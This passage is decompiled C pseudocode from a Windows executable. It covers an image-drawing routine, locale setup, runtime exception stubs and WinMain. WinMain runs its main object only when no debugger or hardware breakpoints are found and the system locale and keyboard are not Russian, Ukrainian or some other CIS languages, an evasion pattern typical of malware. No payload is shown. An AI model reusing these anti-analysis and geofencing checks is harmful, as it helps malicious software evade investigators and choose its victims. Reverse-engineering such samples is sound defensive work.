  int v66; // [esp+70h] [ebp-18h]
  int v67; // [esp+74h] [ebp-14h]
  int v68; // [esp+78h] [ebp-10h]
  int v69; // [esp+84h] [ebp-4h]

  v9 = this;
  v62 = this;
  v10 = this[5] == 0;
  v11 = *(float *)&a8;
  v68 = a2;
  v66 = a3;
  v56 = a6;
  v54 = a7;
  v65 = *(float *)&a8;
  v63 = a9;
  if ( v10 )
    return v9;
  v12 = *this;
  if ( !*v9 )
    return v9;
  if ( !v9[1] )
    return v9;
  if ( !v9[2] )
    return v9;
  if ( !v9[3] )
    return v9;
  v50 = a6[5];
  if ( !v50 || !a7[5] )
    return v9;
  v13 = v9[2] * v9[3];
  v60 = a6[1];
  v14 = v12 * v9[1] * v13;
  v61 = a6[3];
  v64 = a6[2];
  v67 = *a6;
  v15 = v14 + v9[5];
  v16 = a6[5];
  v58 = v15;
  if ( v15 <= v16 )
  {
    v17 = v9[5];
LABEL_15:
    v21 = a7[3];
    v52 = a7[1];
    v51 = *a7;
    v22 = a7[1] * v51;
    v53 = v21;
    v23 = v21 * a7[2] * v22;
    v24 = a7[5];
    v55 = v23;
    v9 = v62;
    if ( v58 > v24 && v17 < v55 + v24 )
    {
      sub_42A7F0(v47, (int)a7, v17);
      v69 = 1;
      v18 = sub_42D780(v68, v66, 0, 0, a6, v47, LODWORD(v65), LODWORD(v63));
      goto LABEL_11;
    }
    if ( *a7 != v67 || a7[1] != v60 || a7[2] != v64 )
    {
      sub_41C6D0();
      sub_41C2D0(
        (int)pExceptionObject,
        (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::draw_image(): Sprite (%u,%u,%u,%u,%p) and mask (%u,%u,%u,%u,%"
             "p) have incompatible dimensions.",
        *v62);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
    }
    v25 = v68;
    if ( v68 < 0 )
      v25 = 0;
    v26 = v66;
    v58 = v25;
    v27 = v66;
    if ( v66 < 0 )
      v27 = 0;
    v28 = v25 - v68;
    v57 = v27;
    v59 = v25 - v68;
    v66 = v27 - v66;
    if ( v68 + v67 <= *v62 )
      v29 = 0;
    else
      v29 = v68 + v67 - *v62;
    v67 = v67 - v29 - v28;
    v30 = v62[1];
    if ( v60 + v26 <= v30 )
      v31 = 0;
    else
      v31 = v26 + v60 - v30;
    v32 = v60 - v31 - v66;
    v33 = v64 - v62[2];
    v34 = v61;
    if ( v64 <= v62[2] )
      v33 = 0;
    v60 = v32;
    v35 = v64 - v33;
    v36 = v61 <= v62[3];
    v64 -= v33;
    if ( !v36 )
      v34 = v62[3];
    v61 = v34;
    if ( v67 > 0 && v32 > 0 && v35 > 0 && v34 > 0 )
    {
      v68 = 0;
      do
      {
        v37 = 0;
        v63 = 0.0;
        do
        {
          v38 = 0;
          do
          {
            v39 = (unsigned __int8 *)(v59 + v56[5] + *v56 * (v66 + v38 + v56[1] * (v37 + v68 * v56[2])));
            v40 = (unsigned __int8 *)(v54[5] + (v59 + *v54 * (v66 + v38 + v54[1] * (v37 + v68 * v54[2]))) % v55);
            v41 = v67;
            do
            {
              v42 = (__m128)COERCE_UNSIGNED_INT((float)*v40);
              v42.m128_f32[0] = v42.m128_f32[0] * v11;
              v43 = sub_41C8A0(v42).m128_f32[0];
              v44 = *v39++;
              v46 = (int)(float)((float)((float)(v43 * (float)v44)
                                       + (float)((float)(a9 - fmaxf(0.0, v42.m128_f32[0])) * (float)(unsigned __int8)*v45))
                               / a9);
              v11 = v65;
              *v45 = v46;
              --v41;
            }
            while ( v41 );
            v37 = LODWORD(v63);
            ++v38;
            v9 = v62;
          }
          while ( v38 < v60 );
          v37 = LODWORD(v63) + 1;
          v63 = *(float *)&v37;
        }
        while ( v37 < v64 );
        ++v68;
      }
      while ( v68 < v61 );
    }
    return v9;
  }
  v17 = v9[5];
  if ( v17 >= v61 * v64 * v60 * v67 + v16 )
    goto LABEL_15;
  sub_42A7F0(v47, (int)a6, v9[5]);
  v69 = 0;
  v18 = sub_42D780(v68, v66, 0, 0, v47, a7, LODWORD(v65), LODWORD(v63));
LABEL_11:
  v19 = v18;
  if ( !pExceptionObject[8] )
    j_j__free(Block);
  return (int *)v19;
}
// 42DA80: variable 'v40' is possibly undefined
// 42DA9F: variable 'v45' is possibly undefined
// 42D780: using guessed type _DWORD var_70[2];

//----- (0042DB80) --------------------------------------------------------
void __thiscall sub_42DB80(void **this)
{
  std::_Locinfo::_Locinfo_dtor((struct std::_Locinfo *)this);
  if ( this[11] )
    free(this[11]);
  this[11] = 0;
  if ( this[9] )
    free(this[9]);
  this[9] = 0;
  if ( this[7] )
    free(this[7]);
  this[7] = 0;
  if ( this[5] )
    free(this[5]);
  this[5] = 0;
  if ( this[3] )
    free(this[3]);
  this[3] = 0;
  if ( this[1] )
    free(this[1]);
  this[1] = 0;
  std::_Lockit::~_Lockit((std::_Lockit *)this);
}

//----- (0042DC70) --------------------------------------------------------
void __thiscall sub_42DC70(struct std::locale::_Locimp **this, _DWORD *Src, int a3)
{
  struct std::locale::_Locimp **v3; // ebx
  _DWORD *v4; // edi
  const char *v5; // esi
  const char *v6; // ecx
  int v7; // eax
  struct std::locale::_Locimp *v8; // ebx
  _DWORD *v9; // eax
  _BYTE *i; // esi
  size_t v11; // esi
  void *v12; // eax
  void (__thiscall ***v13)(_DWORD, int); // eax
  char v15; // [esp+1Bh] [ebp-45h]
  void *v16[13]; // [esp+1Ch] [ebp-44h] BYREF
  int v17; // [esp+5Ch] [ebp-4h]

  v3 = this;
  v4 = Src;
  v15 = 0;
  std::locale::_Init(0);
  v17 = 0;
  memset(v16, 0, sizeof(v16));
  v5 = (const char *)Src;
  if ( Src[5] >= 0x10u )
    v5 = (const char *)*Src;
  std::_Lockit::_Lockit((std::_Lockit *)v16, 0);
  v16[1] = 0;
  LOBYTE(v16[2]) = 0;
  v16[3] = 0;
  LOBYTE(v16[4]) = 0;
  v16[5] = 0;
  LOWORD(v16[6]) = 0;
  v16[7] = 0;
  LOWORD(v16[8]) = 0;
  v16[9] = 0;
  LOBYTE(v16[10]) = 0;
  v16[11] = 0;
  LOBYTE(v16[12]) = 0;
  LOBYTE(v17) = 7;
  if ( !v5 )
LABEL_36:
    sub_42E5C8((int)"bad locale name");
  std::_Locinfo::_Locinfo_ctor((struct std::_Locinfo *)v16, 63, v5);
  LOBYTE(v17) = 8;
  v6 = (const char *)&v16[12];
  if ( v16[11] )
    v6 = (const char *)v16[11];
  v7 = strcmp(v6, "*");
  if ( v7 )
    v7 = v7 < 0 ? -1 : 1;
  if ( v7 )
  {
    std::locale::_Locimp::_Makeloc((const struct std::_Locinfo *)v16, 63, v3[1], 0);
    *((_DWORD *)v3[1] + 4) = 63;
    if ( Src[5] >= 0x10u )
      v4 = (_DWORD *)*Src;
    v8 = v3[1];
    v9 = (_DWORD *)*((_DWORD *)v8 + 6);
    if ( v9 != v4 )
    {
      if ( v9 )
        free(*((void **)v8 + 6));
      *((_DWORD *)v8 + 6) = 0;
      if ( v4 )
      {
        for ( i = v4; *i; ++i )
          ;
        v11 = i + 1 - (_BYTE *)v4;
        v12 = malloc(v11);
        *((_DWORD *)v8 + 6) = v12;
        if ( v12 )
          memmove(v12, v4, v11);
      }
    }
    v3 = this;
  }
  else
  {
    v15 = 1;
  }
  LOBYTE(v17) = 9;
  std::_Locinfo::_Locinfo_dtor((struct std::_Locinfo *)v16);
  if ( v16[11] )
    free(v16[11]);
  v16[11] = 0;
  if ( v16[9] )
    free(v16[9]);
  v16[9] = 0;
  if ( v16[7] )
    free(v16[7]);
  v16[7] = 0;
  if ( v16[5] )
    free(v16[5]);
  v16[5] = 0;
  if ( v16[3] )
    free(v16[3]);
  v16[3] = 0;
  if ( v16[1] )
    free(v16[1]);
  v16[1] = 0;
  std::_Lockit::~_Lockit((std::_Lockit *)v16);
  v17 = -1;
  if ( v15 )
  {
    v13 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(struct std::locale::_Locimp *))(*(_DWORD *)v3[1] + 8))(v3[1]);
    if ( v13 )
      (**v13)(v13, 1);
    goto LABEL_36;
  }
}

//----- (0042DEE0) --------------------------------------------------------
void __thiscall sub_42DEE0(_DWORD *this)
{
  int v1; // ecx
  void (__thiscall ***v2)(_DWORD, int); // eax

  v1 = this[1];
  if ( v1 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v1 + 8))(v1);
    if ( v2 )
      (**v2)(v2, 1);
  }
}

//----- (0042DF00) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  int v4; // ecx
  void *v5; // ecx
  void (__thiscall ***v6)(_DWORD, int); // eax
  void (__thiscall ***v7)(_DWORD, int); // eax
  HANDLE CurrentThread; // eax
  LCID UserDefaultLCID; // eax
  bool v10; // bh
  LCID v11; // eax
  bool v12; // bl
  bool v13; // bl
  unsigned __int16 KeyboardLayout; // ax
  int v15; // edx
  _DWORD *v16; // edi
  _DWORD *v17; // ebx
  void *v18; // esi
  _DWORD *v19; // esi
  void *v20; // ecx
  void *v21; // ecx
  void *v22; // ecx
  void *v23; // ecx
  void (__thiscall **v24)(_DWORD *, int); // eax
  int v26; // [esp+0h] [ebp-378h] BYREF
  void *v27[5]; // [esp+10h] [ebp-368h] BYREF
  unsigned int v28; // [esp+24h] [ebp-354h]
  void *v29[5]; // [esp+28h] [ebp-350h] BYREF
  unsigned int v30; // [esp+3Ch] [ebp-33Ch]
  void *v31[5]; // [esp+40h] [ebp-338h] BYREF
  unsigned int v32; // [esp+54h] [ebp-324h]
  void *v33[5]; // [esp+58h] [ebp-320h] BYREF
  unsigned int v34; // [esp+6Ch] [ebp-30Ch]
  void *Block[4]; // [esp+70h] [ebp-308h] BYREF
  int v36; // [esp+80h] [ebp-2F8h]
  unsigned int v37; // [esp+84h] [ebp-2F4h]
  char v38[4]; // [esp+88h] [ebp-2F0h] BYREF
  int v39; // [esp+8Ch] [ebp-2ECh]
  CONTEXT Context; // [esp+90h] [ebp-2E8h] BYREF
  struct std::locale::_Locimp *v41; // [esp+35Ch] [ebp-1Ch] BYREF
  void *v42; // [esp+360h] [ebp-18h]
  int *v43; // [esp+368h] [ebp-10h]
  int v44; // [esp+374h] [ebp-4h]
  int savedregs; // [esp+378h] [ebp+0h] BYREF

  v43 = &v26;
  v44 = 0;
  setlocale(0, Src);
  v42 = std::locale::_Locimp::_New_Locimp(0);
  v36 = 0;
  v37 = 15;
  LOBYTE(Block[0]) = 0;
  sub_40A390(Block, (void *)Src, 0);
  LOBYTE(v44) = 1;
  sub_42DC70(&v41, Block, v4);
  LOBYTE(v44) = 0;
  if ( v37 >= 0x10 )
  {
    v5 = Block[0];
    if ( v37 + 1 >= 0x1000 )
    {
      v5 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v5 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v5);
  }
  v36 = 0;
  v37 = 15;
  LOBYTE(Block[0]) = 0;
  LOBYTE(v44) = 2;
  std::locale::global(v38, &v41);
  if ( v39 )
  {
    v6 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v39 + 8))(v39);
    if ( v6 )
      (**v6)(v6, 1);
  }
  LOBYTE(v44) = 0;
  if ( v42 )
  {
    v7 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(void *))(*(_DWORD *)v42 + 8))(v42);
    if ( v7 )
      (**v7)(v7, 1);
  }
  if ( !IsDebuggerPresent() )
  {
    memset(&Context.Dr0, 0, 0x2C8u);
    Context.ContextFlags = 65552;
    CurrentThread = GetCurrentThread();
    if ( !GetThreadContext(CurrentThread, &Context) || !Context.Dr0 && !Context.Dr1 && !Context.Dr2 && !Context.Dr3 )
    {
      UserDefaultLCID = GetUserDefaultLCID();
      v10 = UserDefaultLCID != 1049 && UserDefaultLCID != 1058;
      v11 = GetUserDefaultLCID();
      v12 = v11 != 1049 && v11 != 1058;
      v13 = v10 && v12;
      KeyboardLayout = (unsigned __int16)GetKeyboardLayout(0);
      if ( KeyboardLayout != 1049 && KeyboardLayout != 1157 && KeyboardLayout != 1092 && KeyboardLayout != 1058 && v13 )
      {
        v15 = sub_40C780(&dword_4FA828, (int)v27, (int)&savedregs);
        LOBYTE(v44) = 3;
        v39 = (int)sub_414750(v29, v15);
        LOBYTE(v44) = 4;
        v16 = (_DWORD *)sub_40C780(&dword_4FA7F8, (int)v31, (int)&savedregs);
        LOBYTE(v44) = 5;
        v17 = (_DWORD *)sub_40C780(&dword_4FA960, (int)v33, (int)&savedregs);
        LOBYTE(v44) = 6;
        v18 = operator new(0x8Cu);
        v42 = v18;
        LOBYTE(v44) = 7;
        memset(v18, 0, 0x8Cu);
        v19 = (_DWORD *)sub_41F0D0((char *)v18, 300000, 100, v17, v16, (void *)v39);
        v42 = v19;
        LOBYTE(v44) = 9;
        if ( v34 >= 8 )
        {
          v20 = v33[0];
          if ( 2 * v34 + 2 >= 0x1000 )
          {
            v20 = (void *)*((_DWORD *)v33[0] - 1);
            if ( (unsigned int)(v33[0] - v20 - 4) > 0x1F )
              goto LABEL_49;
          }
          sub_44775B(v20);
        }
        v33[4] = 0;
        v34 = 7;
        LOWORD(v33[0]) = 0;
        LOBYTE(v44) = 10;
        if ( v32 >= 8 )
        {
          v21 = v31[0];
          if ( 2 * v32 + 2 >= 0x1000 )
          {
            v21 = (void *)*((_DWORD *)v31[0] - 1);
            if ( (unsigned int)(v31[0] - v21 - 4) > 0x1F )
              goto LABEL_49;
          }
          sub_44775B(v21);
        }
        v31[4] = 0;
        v32 = 7;
        LOWORD(v31[0]) = 0;
        LOBYTE(v44) = 11;
        if ( v30 >= 8 )
        {
          v22 = v29[0];
          if ( 2 * v30 + 2 >= 0x1000 )
          {
            v22 = (void *)*((_DWORD *)v29[0] - 1);
            if ( (unsigned int)(v29[0] - v22 - 4) > 0x1F )
              goto LABEL_49;
          }
          sub_44775B(v22);
        }
        v29[4] = 0;
        v30 = 7;
        LOWORD(v29[0]) = 0;
        LOBYTE(v44) = 12;
        if ( v28 < 8 )
        {
LABEL_46:
          v27[4] = 0;
          LOWORD(v27[0]) = 0;
          v24 = (void (__thiscall **)(_DWORD *, int))*v19;
          v28 = 7;
          ((void (__thiscall *)(_DWORD *))v24[4])(v19);
          (*(void (__thiscall **)(_DWORD *, int))*v19)(v19, 1);
          return 0;
        }
        v23 = v27[0];
        if ( 2 * v28 + 2 < 0x1000 || (v23 = (void *)*((_DWORD *)v27[0] - 1), (unsigned int)(v27[0] - v23 - 4) <= 0x1F) )
        {
          sub_44775B(v23);
          goto LABEL_46;
        }
LABEL_49:
        _invalid_parameter_noinfo_noreturn();
      }
    }
  }
  return 0;
}
// 42DF8D: variable 'v4' is possibly undefined
// 433E0A: using guessed type int __cdecl std::locale::global(_DWORD, _DWORD);
// 42DF00: using guessed type char var_2F0[4];

//----- (0042E3B0) --------------------------------------------------------
void **__thiscall sub_42E3B0(void **this, _BYTE *Src)
{
  _BYTE *i; // esi
  size_t v4; // esi
  void *v5; // eax

  if ( *this == Src )
    return this;
  if ( *this )
    free(*this);
  *this = 0;
  if ( !Src )
    return this;
  for ( i = Src; *i; ++i )
    ;
  v4 = i - Src + 1;
  v5 = malloc(v4);
  *this = v5;
  if ( v5 )
    memmove(v5, Src, v4);
  return this;
}

//----- (0042E414) --------------------------------------------------------
_DWORD *__thiscall sub_42E414(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad allocation";
  *this = &std::bad_alloc::`vftable';
  return result;
}
// 48F980: using guessed type void *std::bad_alloc::`vftable';

//----- (0042E42C) --------------------------------------------------------
char *__thiscall sub_42E42C(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &std::bad_function_call::`vftable';
  return this;
}
// 48F99C: using guessed type void *std::bad_function_call::`vftable';

//----- (0042E458) --------------------------------------------------------
char *__thiscall sub_42E458(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &std::invalid_argument::`vftable';
  return this;
}
// 48F9C8: using guessed type void *std::invalid_argument::`vftable';

//----- (0042E473) --------------------------------------------------------
char *__thiscall sub_42E473(char *this, int a2)
{
  sub_405BE0(this, a2);
  *(_DWORD *)this = &std::invalid_argument::`vftable';
  return this;
}
// 48F9C8: using guessed type void *std::invalid_argument::`vftable';

//----- (0042E492) --------------------------------------------------------
char *__thiscall sub_42E492(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 48F9D4: using guessed type void *std::length_error::`vftable';

//----- (0042E4AD) --------------------------------------------------------
char *__thiscall sub_42E4AD(char *this, int a2)
{
  sub_405BE0(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 48F9D4: using guessed type void *std::length_error::`vftable';

//----- (0042E4CC) --------------------------------------------------------
char *__thiscall sub_42E4CC(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &std::logic_error::`vftable';
  return this;
}
// 48F9BC: using guessed type void *std::logic_error::`vftable';

//----- (0042E4E7) --------------------------------------------------------
char *__thiscall sub_42E4E7(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &std::out_of_range::`vftable';
  return this;
}
// 48F9E0: using guessed type void *std::out_of_range::`vftable';

//----- (0042E502) --------------------------------------------------------
char *__thiscall sub_42E502(char *this, int a2)
{
  sub_405BE0(this, a2);
  *(_DWORD *)this = &std::out_of_range::`vftable';
  return this;
}
// 48F9E0: using guessed type void *std::out_of_range::`vftable';

//----- (0042E54E) --------------------------------------------------------
void __noreturn sub_42E54E()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_42E414(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
}
// 42E54E: using guessed type void __noreturn sub_42E54E();
// 42E54E: using guessed type _DWORD pExceptionObject[3];

//----- (0042E588) --------------------------------------------------------
void __cdecl __noreturn sub_42E588(int a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_42E4AD(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVlength_error_std__);
}

//----- (0042E5A8) --------------------------------------------------------
void __cdecl __noreturn sub_42E5A8(int a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_42E502(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVout_of_range_std__);
}

//----- (0042E5C8) --------------------------------------------------------
void __cdecl __noreturn sub_42E5C8(int a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_405D10(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVruntime_error_std__);
}

//----- (0042E5E8) --------------------------------------------------------
const char *sub_42E5E8()
{
  return "bad function call";
}

//----- (0042E60D) --------------------------------------------------------
int __stdcall sub_42E60D(int a1, char *a2, int a3)
{
  const struct _s_ThrowInfo *v4; // [esp+0h] [ebp-20h]

  *((_DWORD *)a2 + 1) = 1;
  *((_DWORD *)a2 + 2) = 1;
  *(_DWORD *)a2 = `anonymous namespace'::_ExceptionPtr_static<std::bad_alloc>::`vftable';
  sub_42E414((_DWORD *)a2 + 23);
  `anonymous namespace'::_PopulateCppExceptionRecord(
    (_anonymous_namespace_ *)(a2 + 12),
    (struct _EXCEPTION_RECORD *)(a2 + 92),
    &_TI2_AVbad_alloc_std__,
    v4);
  return 1;
}
// 42E65D: variable 'v4' is possibly undefined
// 48FA28: using guessed type int (*`anonymous namespace'::_ExceptionPtr_static<std::bad_alloc>::`vftable'[2])();

//----- (0042E67D) --------------------------------------------------------
int __stdcall sub_42E67D(int a1, char *a2, int a3)
{
  const struct _s_ThrowInfo *v4; // [esp+0h] [ebp-20h]

  *((_DWORD *)a2 + 1) = 1;
  *((_DWORD *)a2 + 2) = 1;
  *(_DWORD *)a2 = `anonymous namespace'::_ExceptionPtr_static<std::bad_exception>::`vftable';
  sub_42E7AA((_DWORD *)a2 + 23);
  `anonymous namespace'::_PopulateCppExceptionRecord(
    (_anonymous_namespace_ *)(a2 + 12),
    (struct _EXCEPTION_RECORD *)(a2 + 92),
    &_TI2_AVbad_exception_std__,
    v4);
  return 1;
}
// 42E6CD: variable 'v4' is possibly undefined
// 48FA3C: using guessed type int (*`anonymous namespace'::_ExceptionPtr_static<std::bad_exception>::`vftable'[2])();

//----- (0042E759) --------------------------------------------------------
char *__thiscall sub_42E759(char *this, int a2)
{
  sub_403C10(this, a2);
  *(_DWORD *)this = &std::bad_exception::`vftable';
  return this;
}
// 48F9F8: using guessed type void *std::bad_exception::`vftable';

//----- (0042E7AA) --------------------------------------------------------
_DWORD *__thiscall sub_42E7AA(_DWORD *this)
{
  *this = &std::exception::`vftable';
  this[2] = 0;
  this[1] = "bad exception";
  *this = &std::bad_exception::`vftable';
  return this;
}
// 48F974: using guessed type void *std::exception::`vftable';
// 48F9F8: using guessed type void *std::bad_exception::`vftable';

//----- (0042E93A) --------------------------------------------------------
char *__thiscall sub_42E93A(char *Block, char a2)
{
  unknown_libname_1(Block + 92);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 403C40: using guessed type int __thiscall unknown_libname_1(_DWORD);

//----- (0042E98E) --------------------------------------------------------
char *__thiscall sub_42E98E(char *Block, char a2)
{
  unknown_libname_6(Block + 92);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 42E80A: using guessed type int __thiscall unknown_libname_6(_DWORD);

//----- (0042EA28) --------------------------------------------------------
void *__thiscall sub_42EA28(void *Block, char a2)
{
  unknown_libname_6(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 42E80A: using guessed type int __thiscall unknown_libname_6(_DWORD);

//----- (0042ED48) --------------------------------------------------------
void __thiscall sub_42ED48(void *Block)
{
  free(Block);
}

//----- (0042EE23) --------------------------------------------------------
_DWORD *__cdecl sub_42EE23(_DWORD *a1)
{
  int v1; // ecx
  _DWORD *result; // eax

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_4FF6B0,
          (int (__stdcall *)(void *, void *, void **))sub_42E60D,
          &unk_4FF6B8) )
    terminate(v1);
  result = a1;
  *a1 = 0;
  a1[1] = 0;
  _InterlockedIncrement(&dword_4FF6BC);
  *a1 = &unk_4FF6C4;
  a1[1] = &unk_4FF6B8;
  return result;
}
// 42EE9D: variable 'v1' is possibly undefined
// 46203B: using guessed type void __thiscall __noreturn terminate(_DWORD);
// 4FF6BC: using guessed type int dword_4FF6BC;

//----- (0042EEA3) --------------------------------------------------------
_DWORD *__cdecl sub_42EEA3(_DWORD *a1)
{
  int v1; // ecx
  _DWORD *result; // eax

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_4FF640,
          (int (__stdcall *)(void *, void *, void **))sub_42E67D,
          &unk_4FF648) )
    terminate(v1);
  result = a1;
  *a1 = 0;
  a1[1] = 0;
  _InterlockedIncrement(&dword_4FF64C);
  *a1 = &unk_4FF654;
  a1[1] = &unk_4FF648;
  return result;
}
// 42EF1D: variable 'v1' is possibly undefined
// 46203B: using guessed type void __thiscall __noreturn terminate(_DWORD);
// 4FF64C: using guessed type int dword_4FF64C;

//----- (0042EF7B) --------------------------------------------------------
int __cdecl sub_42EF7B(int a1, int a2)
{
  return std::shared_ptr<_EXCEPTION_RECORD const>::operator=(a2);
}
// 42E8C7: using guessed type _DWORD __stdcall std::shared_ptr<_EXCEPTION_RECORD const>::operator=(_DWORD);

//----- (0042F60B) --------------------------------------------------------
_DWORD *__cdecl sub_42F60B(_DWORD *a1)
{
  if ( dword_4FF92C < 0 )
    goto LABEL_4;
  if ( dword_4FF92C <= 1 )
  {
    if ( dword_4FFACC )
    {
      *a1 = &Concurrency::details::stl_condition_variable_win7::`vftable';
      unknown_libname_41(a1 + 1);
      return a1;
    }
  }
  else if ( dword_4FF92C != 2 )
  {
LABEL_4:
    *a1 = &Concurrency::details::stl_condition_variable_concrt::`vftable';
    return sub_448E2F(a1 + 1);
  }
  if ( !dword_4FFAB4 )
    goto LABEL_4;
  *a1 = &Concurrency::details::stl_condition_variable_vista::`vftable';
  unknown_libname_41(a1 + 1);
  return a1;
}
// 43493D: using guessed type _DWORD __cdecl unknown_libname_41(_DWORD);
// 48FA50: using guessed type void *Concurrency::details::stl_condition_variable_vista::`vftable';
// 48FA68: using guessed type void *Concurrency::details::stl_condition_variable_win7::`vftable';
// 48FA80: using guessed type void *Concurrency::details::stl_condition_variable_concrt::`vftable';
// 4FF92C: using guessed type int dword_4FF92C;
// 4FFAB4: using guessed type int dword_4FFAB4;
// 4FFACC: using guessed type int dword_4FFACC;

//----- (0042F657) --------------------------------------------------------
void __thiscall sub_42F657(_DWORD *this)
{
  sub_448EAB(this + 1);
}

//----- (0042F727) --------------------------------------------------------
void __thiscall sub_42F727(_DWORD *this)
{
  sub_449742(this + 1);
}

//----- (0042F72F) --------------------------------------------------------
int __thiscall sub_42F72F(char *this)
{
  return unknown_libname_48(this + 4);
}
// 434AA3: using guessed type _DWORD __cdecl unknown_libname_48(_DWORD);

//----- (0042F73A) --------------------------------------------------------
void __thiscall sub_42F73A(_DWORD *this)
{
  sub_4497AD(this + 1);
}

//----- (0042F742) --------------------------------------------------------
int __thiscall sub_42F742(char *this)
{
  return unknown_libname_49(this + 4);
}
// 434ABD: using guessed type _DWORD __cdecl unknown_libname_49(_DWORD);

//----- (0042F839) --------------------------------------------------------
int __cdecl sub_42F839(int a1, struct _Mtx_internal_imp_t *a2, int a3)
{
  return unknown_libname_9(a1, a2, a3);
}

//----- (0042F842) --------------------------------------------------------
int __cdecl sub_42F842(int a1, _Mtx_t a2)
{
  return unknown_libname_9(a1, a2, 0);
}

//----- (0042F857) --------------------------------------------------------
int __thiscall sub_42F857(int this, int a2)
{
  sub_403C10((char *)this, a2);
  *(_DWORD *)this = &std::future_error::`vftable';
  *(_DWORD *)(this + 12) = *(_DWORD *)(a2 + 12);
  *(_DWORD *)(this + 16) = *(_DWORD *)(a2 + 16);
  return this;
}
// 48FA98: using guessed type void *std::future_error::`vftable';

//----- (0042F923) --------------------------------------------------------
const char *__thiscall sub_42F923(int *this)
{
  return sub_407F20(this[3]);
}

//----- (0042FB5E) --------------------------------------------------------
const char *sub_42FB5E()
{
  return "system";
}

//----- (0042FD6E) --------------------------------------------------------
_DWORD *__cdecl sub_42FD6E(int a1)
{
  if ( dword_4FF92C < 0 )
    goto LABEL_4;
  if ( dword_4FF92C <= 1 )
  {
    if ( dword_4FFACC )
    {
      *(_DWORD *)a1 = &Concurrency::details::stl_critical_section_win7::`vftable';
      unknown_libname_42(a1 + 4);
      return (_DWORD *)a1;
    }
  }
  else if ( dword_4FF92C != 2 )
  {
LABEL_4:
    *(_DWORD *)a1 = &Concurrency::details::stl_critical_section_concrt::`vftable';
    return sub_449EFD((_DWORD *)(a1 + 4));
  }
  if ( !dword_4FFAB4 )
    goto LABEL_4;
  *(_DWORD *)a1 = &Concurrency::details::stl_critical_section_vista::`vftable';
  __crtInitializeCriticalSectionEx((LPCRITICAL_SECTION)(a1 + 4), 0xFA0u, 0);
  return (_DWORD *)a1;
}
// 43498C: using guessed type _DWORD __cdecl unknown_libname_42(_DWORD);
// 490650: using guessed type void *Concurrency::details::stl_critical_section_vista::`vftable';
// 490668: using guessed type void *Concurrency::details::stl_critical_section_win7::`vftable';
// 490680: using guessed type void *Concurrency::details::stl_critical_section_concrt::`vftable';
// 4FF92C: using guessed type int dword_4FF92C;
// 4FFAB4: using guessed type int dword_4FFAB4;
// 4FFACC: using guessed type int dword_4FFACC;

//----- (0042FDBA) --------------------------------------------------------
void sub_42FDBA()
{
  ;
}
// 40F6A0: using guessed type _DWORD _guard_check_icall_nop();

//----- (0042FDC2) --------------------------------------------------------
void __thiscall sub_42FDC2(int this)
{
  DeleteCriticalSection((LPCRITICAL_SECTION)(this + 4));
}

//----- (0042FDCD) --------------------------------------------------------
signed __int32 __thiscall sub_42FDCD(int this)
{
  return sub_44A3EE((void *)(this + 4));
}

//----- (0042FDE0) --------------------------------------------------------
int __thiscall sub_42FDE0(char *this)
{
  return unknown_libname_33(this + 4);
}
// 4346A4: using guessed type _DWORD __cdecl unknown_libname_33(_DWORD);

//----- (0042FF8F) --------------------------------------------------------
char __thiscall sub_42FF8F(void *this)
{
  return sub_44A41C((signed __int32)this + 4);
}

//----- (0042FFE7) --------------------------------------------------------
void __thiscall sub_42FFE7(int this)
{
  sub_44A4C5((void *)(this + 4));
}

//----- (0042FFEF) --------------------------------------------------------
void __thiscall sub_42FFEF(int this)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(this + 4));
}

//----- (0042FFFA) --------------------------------------------------------
int __thiscall sub_42FFFA(char *this)
{
  return unknown_libname_43(this + 4);
}
// 4349A6: using guessed type _DWORD __cdecl unknown_libname_43(_DWORD);

//----- (004302FD) --------------------------------------------------------
int sub_4302FD()
{
  return unknown_libname_50(&stru_4FF998);
}

//----- (0043064E) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_43064E(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

